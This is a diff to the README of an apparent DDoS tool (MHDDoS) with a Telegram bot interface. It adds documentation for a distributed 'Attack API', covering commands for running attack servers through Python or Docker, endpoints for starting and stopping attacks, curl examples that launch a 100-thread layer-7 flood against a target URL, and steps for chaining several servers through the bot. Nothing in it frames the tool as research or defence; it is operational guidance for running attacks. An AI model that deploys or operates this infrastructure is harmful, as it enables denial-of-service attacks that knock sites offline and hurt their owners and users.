@@ -240,6 +240,86 @@ export TELEGRAM_ALLOWED_USERS='123456789,987654321'
 - Proxy type selection
 - Built-in tools (INFO, PING, CHECK, DSTAT, TSSRV)
 - Attack status monitoring
+- **API Manager** - Connect to remote Attack API servers for distributed attacks
+
+---
+
+## Attack API (Distributed Mode)
+
+The Attack API allows you to separate the bot interface from attack execution, enabling:
+- Distributed attacks across multiple servers
+- Better resource management
+- Scalable attack infrastructure
+
+### Running the Attack API Server
+
+```shell script
+# Option 1: Direct Python
+python3 attack_api.py
+
+# Option 2: Docker
+docker build -f Dockerfile.api -t mhddos-api .
+docker run -p 5000:5000 mhddos-api
+
+# Option 3: Docker Compose
+docker compose up mhddos-api
+```
+
+**Environment Variables**
+
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `ATTACK_API_PORT` | 5000 | API server port |
+| `ATTACK_API_HOST` | 0.0.0.0 | API server host |
+| `ATTACK_API_KEY` | (none) | API key for authentication |
+
+### API Endpoints
+
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| GET | `/health` | Health check |
+| GET | `/info` | Server info and capabilities |
+| POST | `/attack/start` | Start an attack |
+| POST | `/attack/stop` | Stop an attack |
+| GET | `/attack/status` | Get attack status |
+
+### Example API Usage
+
+```shell script
+# Start an attack
+curl -X POST http://localhost:5000/attack/start \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: your-api-key" \
+  -d '{
+    "method": "GET",
+    "target": "http://example.com",
+    "threads": 100,
+    "duration": 60,
+    "rpc": 1,
+    "is_layer7": true
+  }'
+
+# Check status
+curl http://localhost:5000/attack/status \
+  -H "X-API-Key: your-api-key"
+
+# Stop attack
+curl -X POST http://localhost:5000/attack/stop \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: your-api-key" \
+  -d '{"attack_id": "all"}'
+```
+
+### Connecting APIs to Telegram Bot
+
+1. Deploy one or more Attack API servers
+2. In the Telegram bot, go to **🌐 API Manager**
+3. Click **➕ Add API**
+4. Enter the API name, URL, and optional API key
+5. When starting an attack, you can choose to use:
+   - **Local Attack** - Run on bot's machine
+   - **API Attack** - Run on all connected APIs
+   - **All** - Run on both local and APIs
 
 ---
 
